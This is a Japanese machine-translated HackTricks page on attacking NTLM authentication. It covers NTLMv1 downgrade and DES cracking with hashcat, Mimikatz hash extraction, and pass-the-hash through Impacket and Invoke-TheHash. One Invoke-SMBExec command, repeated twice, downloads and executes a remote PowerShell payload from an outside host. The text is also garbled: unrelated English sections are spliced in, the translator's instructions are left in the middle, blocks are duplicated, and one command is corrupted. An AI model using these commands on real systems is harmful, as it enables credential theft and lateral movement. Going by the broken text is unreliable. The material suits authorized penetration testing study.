# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたいですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 基本情報

**NTLMの資格情報**: ドメイン名（ある場合）、ユーザー名、パスワードハッシュ。

**LM**は**Windows XPとサーバー2003**でのみ**有効**です（LMハッシュはクラックできます）。LMハッシュAAD3B435B51404EEAAD3B435B51404EEは、LMが使用されていないことを意味します（空の文字列のLMハッシュです）。

デフォルトでは**Kerberos**が使用されるため、NTLMは**Active Directoryが構成されていない**、**ドメインが存在しない**、**Kerberosが機能していない**（構成が不良）か、**クライアント**が有効なホスト名の代わりにIPを使用して接続しようとする場合にのみ使用されます。

NTLM認証の**ネットワークパケット**にはヘッダー "**NTLMSSP**" があります。

プロトコル：LM、NTLMv1、NTLMv2は、%windir%\Windows\System32\msv1\_0.dllのDLLでサポートされています。

## LM、NTLMv1、NTLMv2

使用されるプロトコルを確認および設定できます：

### GUI

_secpol.msc_を実行 -> ローカルポリシー -> セキュリティオプション -> ネットワークセキュリティ：LANマネージャ認証レベル。レベルは0から5までの6つあります。

![](<../../.gitbook/assets/image (92).png>)

### レジストリ

これにより、レベル5が設定されます：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能な値:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本的なNTLMドメイン認証スキーム

1. **ユーザー**が**資格情報**を入力します。
2. クライアントマシンは、**ドメイン名**と**ユーザー名**を含む認証リクエストを送信します。
3. **サーバー**は**チャレンジ**を送信します。
4. クライアントは、パスワードのハッシュをキーとして**チャレンジ**を暗号化し、応答として送信します。
5. **サーバー**は**ドメインコントローラー**に**ドメイン名、ユーザー名、チャレンジ、応答**を送信します。Active Directoryが構成されていない場合や、ドメイン名がサーバーの名前である場合、資格情報は**ローカルで確認**されます。
6. **ドメインコントローラー**は、すべてが正しいかどうかを確認し、情報をサーバーに送信します。

**サーバー**と**ドメインコントローラー**は、**Netlogon**サーバーを介して**セキュアチャネル**を作成できます。ドメインコントローラーはサーバーのパスワードを知っているため、これが可能です（これは**NTDS.DIT**データベース内にあります）。

### ローカルNTLM認証スキーム

認証は、**以前に述べたものと同じですが**、**サーバー**は**SAM**ファイル内で認証しようとする**ユーザーのハッシュ**を知っています。したがって、ドメインコントローラーに問い合わせる代わりに、**サーバー自体で**ユーザーの認証を確認します。

### NTLMv1チャレンジ

**チャレンジの長さは8バイト**で、**応答の長さは24バイト**です。

**ハッシュNT（16バイト）**は、**7バイトずつ3つのパート**（7B + 7B +（2B + 0x00\*5））に分割されます。**最後のパートはゼロで埋められます**。その後、各パートごとに**チャレンジ**が**別々に暗号化**され、**結果の**暗号化されたバイトが**結合**されます。合計：8B + 8B + 8B = 24バイト。

**問題点**：

- **ランダム性の欠如**
- 3つのパートは**個別に攻撃**され、NTハッシュが見つかる可能性があります。
- **DESは解読可能**
- 3番目のキーは常に**5つのゼロ**で構成されています。
- 同じチャレンジが与えられると、**応答**も**同じ**になります。したがって、被害者に対して文字列「**1122334455667788**」を**チャレンジ**として与え、**事前計算されたレインボーテーブル**を使用して応答を攻撃することができます。

### NTLMv1攻撃

現在では、制約のない委任が構成された環境を見つけることはますます少なくなっていますが、これは**構成されたプリントスプーラーサービス**を悪用することができないことを意味しません。

既にADで持っている一部の資格情報/セッションを悪用して、プリンターに対して**コントロール下のホスト**に対して認証を行うように依頼することができます。その後、`metasploit auxiliary/server/capture/smb`または`responder`を使用して、認証チャレンジを1122334455667788に設定し、認証試行をキャプチャし、それが**NTLMv1**を使用して行われた場合、それを**解読**することができます。\
`responder`を使用している場合は、**認証をダウングレード**するためにフラグ`--lm`を使用してみることもできます。\
_このテクニックでは、認証はNTLMv1を使用して実行する必要があります（NTLMv2は有効ではありません）。_

プリンターは認証中にコンピューターアカウントを使用し、コンピューターアカウントは**長くランダムなパスワード**を使用しますが、一般的な**辞書**を使用してクラックすることはできません。しかし、**NTLMv1**認証は**DESを使用**しています（[詳細はこちら](./#ntlmv1-challenge)）。そのため、DESをクラックするために特に設計されたいくつかのサービスを使用することで、それをクラックすることができます（たとえば、[https://crack.sh/](https://crack.sh)を使用できます）。

### hashcatを使用したNTLMv1攻撃

NTLMv1は、NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)を使用して、hashcatで解読できる形式でNTLMv1メッセージを解読することもできます。

コマンドは以下の通りです。
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
``` would output the below:

```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Hash Leaking

## Introduction

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. However, NTLM hashes can be vulnerable to various attacks, including hash cracking and hash leaking.

This guide will focus on the technique of NTLM hash leaking, which involves extracting and exploiting NTLM hashes from a compromised Windows system.

## Prerequisites

To perform NTLM hash leaking, you will need the following:

- A compromised Windows system with administrative privileges
- A tool capable of extracting NTLM hashes, such as Mimikatz

## Steps

1. Gain administrative access to the compromised Windows system.
2. Download and run Mimikatz on the compromised system.
3. Use the `sekurlsa::logonpasswords` command in Mimikatz to extract the NTLM hashes from the system's memory.
4. Once the hashes are extracted, they can be used for various purposes, such as offline cracking or pass-the-hash attacks.

## Mitigation

To mitigate the risk of NTLM hash leaking, consider the following measures:

- Implement strong password policies to prevent easy hash cracking.
- Disable NTLM authentication and use more secure protocols like Kerberos.
- Regularly update and patch Windows systems to address any known vulnerabilities.
- Monitor and log suspicious activities to detect and respond to potential attacks.

## Conclusion

NTLM hash leaking is a technique that allows attackers to extract and exploit NTLM hashes from compromised Windows systems. By understanding this technique and implementing appropriate security measures, you can better protect your systems from such attacks.
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
以下のコマンドを実行してください（hashtopolisなどのツールを使用して分散処理することが最適です）。そうしないと、数日かかる可能性があります。

```bash
hashcatを実行してください（hashtopolisなどのツールを使用して分散処理することが最適です）。そうしないと、数日かかる可能性があります。
```
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
この場合、パスワードは「password」であることがわかっているため、デモの目的でチートします。
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
以下は、NTLMハッシュの一部としてクラックされたDESキーを変換するために、hashcat-utilitiesを使用する必要があります。
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
# NTLM Hardening

NTLM (NT LAN Manager) is an authentication protocol used by Windows operating systems. However, it has several security vulnerabilities that can be exploited by attackers. This guide provides steps to harden NTLM and mitigate these vulnerabilities.

## Disable NTLMv1

NTLMv1 is an older version of the NTLM protocol and is considered insecure. To disable NTLMv1, follow these steps:

1. Open the Group Policy Editor by typing `gpedit.msc` in the Run dialog box.
2. Navigate to `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options`.
3. Locate the policy named `Network security: LAN Manager authentication level` and double-click it.
4. Select the option `Send NTLMv2 response only. Refuse LM & NTLM`.
5. Click `OK` to save the changes.

## Enable NTLMv2

NTLMv2 is an improved version of the NTLM protocol that provides stronger security. To enable NTLMv2, follow these steps:

1. Open the Group Policy Editor by typing `gpedit.msc` in the Run dialog box.
2. Navigate to `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options`.
3. Locate the policy named `Network security: LAN Manager authentication level` and double-click it.
4. Select the option `Send NTLMv2 response only. Refuse LM`.
5. Click `OK` to save the changes.

## Disable NTLMv2 Session Security

NTLMv2 Session Security is an extension of NTLMv2 that provides additional security measures. However, it can be vulnerable to certain attacks. To disable NTLMv2 Session Security, follow these steps:

1. Open the Group Policy Editor by typing `gpedit.msc` in the Run dialog box.
2. Navigate to `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options`.
3. Locate the policy named `Network security: NTLM SSP based (including secure RPC) client/server` and double-click it.
4. Select the option `Disable` to disable NTLMv2 Session Security.
5. Click `OK` to save the changes.

## Enable NTLM Audit Logging

Enabling NTLM audit logging allows you to monitor NTLM authentication events for potential security breaches. To enable NTLM audit logging, follow these steps:

1. Open the Group Policy Editor by typing `gpedit.msc` in the Run dialog box.
2. Navigate to `Computer Configuration -> Windows Settings -> Security Settings -> Advanced Audit Policy Configuration -> Audit Policies -> Account Logon`.
3. Double-click the policy named `Audit NTLM authentication in this domain`.
4. Select the option `Define these policy settings` and check the box for `Success` and `Failure`.
5. Click `OK` to save the changes.

By following these steps, you can harden NTLM and improve the security of your Windows systems.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
以下は、ハッキング技術に関する本の内容です。以下の内容は、ファイルwindows-hardening/ntlm/README.mdからのものです。関連する英文を日本語に翻訳し、翻訳を保持したまま、同じマークダウンおよびHTMLの構文で返してください。コード、ハッキング技術の名前、ハッキング用語、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加の内容は追加しないでください。
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2チャレンジ

**チャレンジの長さは8バイト**であり、**2つのレスポンスが送信されます**：1つは**24バイト**で、もう1つは**可変長**です。

**最初のレスポンス**は、**クライアントとドメイン**から構成される**文字列**を**HMAC\_MD5**で暗号化し、**NTハッシュ**の**MD4ハッシュ**を**キー**として使用します。その後、**結果**は**チャレンジ**を暗号化するための**キー**として使用されます。これには、**8バイトのクライアントチャレンジ**が追加されます。合計：24 B。

**2番目のレスポンス**は、**複数の値**（新しいクライアントチャレンジ、**リプレイ攻撃**を防ぐための**タイムスタンプ**など）を使用して作成されます。

**成功した認証プロセスをキャプチャしたpcap**がある場合、このガイドに従ってドメイン、ユーザー名、チャレンジ、およびレスポンスを取得し、パスワードを解読してみることができます：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## パス・ザ・ハッシュ

**被害者のハッシュを取得したら**、それを**なりすまし**に使用することができます。\
その**ハッシュ**を使用して**NTLM認証を実行するツール**を使用する必要があります。または、新しい**セッションログオン**を作成し、その**ハッシュ**を**LSASS**に**インジェクト**することもできます。そのため、**NTLM認証が実行されると、そのハッシュが使用されます。**最後のオプションは、mimikatzが行うことです。

**パス・ザ・ハッシュ攻撃は、コンピューターアカウントを使用しても実行できることを覚えておいてください。**

### **Mimikatz**

**管理者として実行する必要があります**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
これにより、mimikatzを起動したユーザーに属するプロセスが開始されますが、LSASS内部ではmimikatzパラメータ内の保存された資格情報が使用されます。その後、そのユーザーとしてネットワークリソースにアクセスできます（`runas /netonly`のトリックと似ていますが、平文パスワードを知る必要はありません）。

### Linuxからのハッシュの渡し

LinuxからPass-the-Hashを使用してWindowsマシンでコード実行を取得することができます。\
[**ここをクリックして方法を学びましょう。**](../../windows/ntlm/broken-reference/)

### Impacket Windowsコンパイル済みツール

Windows用のimpacketバイナリは[こちらからダウンロードできます](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries)。

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe**（この場合、コマンドを指定する必要があります。cmd.exeやpowershell.exeは対話型シェルを取得するためには無効です）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* 他にもいくつかのImpacketバイナリがあります...

### Invoke-TheHash

PowerShellスクリプトはこちらから入手できます：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

Invoke-WMIExecは、Windowsマシン上でWMI（Windows Management Instrumentation）を使用してリモートコード実行を行うためのPowerShellスクリプトです。このスクリプトは、NTLM認証を使用してリモートマシンに接続し、任意のコマンドを実行することができます。

##### 使用法

```
Invoke-WMIExec -Target <Target> -Username <Username> -Password <Password> -Command <Command>
```

- `<Target>`: ターゲットとなるリモートマシンのIPアドレスまたはホスト名を指定します。
- `<Username>`: リモートマシンに接続するためのユーザー名を指定します。
- `<Password>`: ユーザーのパスワードを指定します。
- `<Command>`: 実行するコマンドを指定します。

##### 例

```
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "net user"
```

この例では、192.168.1.100というIPアドレスのリモートマシンにAdministratorというユーザー名とP@ssw0rdというパスワードで接続し、"net user"というコマンドを実行します。

##### 注意事項

- Invoke-WMIExecを使用するには、実行するマシンとターゲットマシンの間でネットワーク接続が確立されている必要があります。
- ユーザー名とパスワードは、リモートマシンにアクセスするための有効な資格情報である必要があります。
- Invoke-WMIExecは、悪意のある目的で使用される可能性があるため、適切な権限と許可を持つ人物によってのみ使用されるべきです。
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

`Invoke-SMBClient` is a PowerShell script that allows you to interact with the Server Message Block (SMB) protocol. It provides a convenient way to perform various operations on SMB shares, such as listing files and directories, uploading and downloading files, and executing commands on remote systems.

Usage:

```powershell
Invoke-SMBClient -Target <target> -Username <username> -Password <password> -Command <command>
```

Parameters:

- `Target`: The IP address or hostname of the target system.
- `Username`: The username to authenticate with.
- `Password`: The password for the specified username.
- `Command`: The command to execute on the remote system.

Example:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "net user"
```

This example connects to the target system with the IP address `192.168.1.100` using the username `Administrator` and password `P@ssw0rd`. It then executes the `net user` command on the remote system.

**Note:** The `Invoke-SMBClient` script requires administrative privileges on the target system in order to perform certain operations.
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

`Invoke-SMBEnum` is a PowerShell script that can be used to enumerate information from SMB services. It can be used to gather information such as user accounts, shares, and sessions from a target system.

Usage:
```
Invoke-SMBEnum -Target <target> [-Username <username>] [-Password <password>] [-Domain <domain>] [-Verbose]
```

Parameters:
- `Target`: The IP address or hostname of the target system.
- `Username`: The username to use for authentication (optional).
- `Password`: The password to use for authentication (optional).
- `Domain`: The domain to use for authentication (optional).
- `Verbose`: Enables verbose output (optional).

Example:
```
Invoke-SMBEnum -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Domain CONTOSO
```

**Note:** This script requires administrative privileges on the target system in order to gather certain information.
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

この関数は、他のすべての関数を組み合わせたものです。複数のホストを渡すことができ、特定のホストを除外することもできます。使用するオプション（SMBExec、WMIExec、SMBClient、SMBEnum）を選択することができます。SMBExecとWMIExecのいずれかを選択した場合、ただし、**Command**パラメータを指定しない場合は、**十分な権限**があるかどうかを**チェック**するだけです。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM パス・ザ・ハッシュ](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**管理者として実行する必要があります**

このツールは、mimikatzと同じことを行います（LSASSメモリの変更）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### ユーザー名とパスワードを使用したWindowsリモート実行の手動方法

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Windowsホストからの資格情報の抽出

**Windowsホストから資格情報を取得する方法についての詳細は、[このページ](broken-reference)を読んでください。**

## NTLMリレーとレスポンダー

**これらの攻撃を実行する方法の詳細なガイドについては、[こちら](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)を参照してください。**

## ネットワークキャプチャからのNTLMチャレンジの解析

**[https://github.com/mlgualtieri/NTLMRawUnHide](https://github.com/mlgualtieri/NTLMRawUnHide)を使用することができます。**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか？** または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
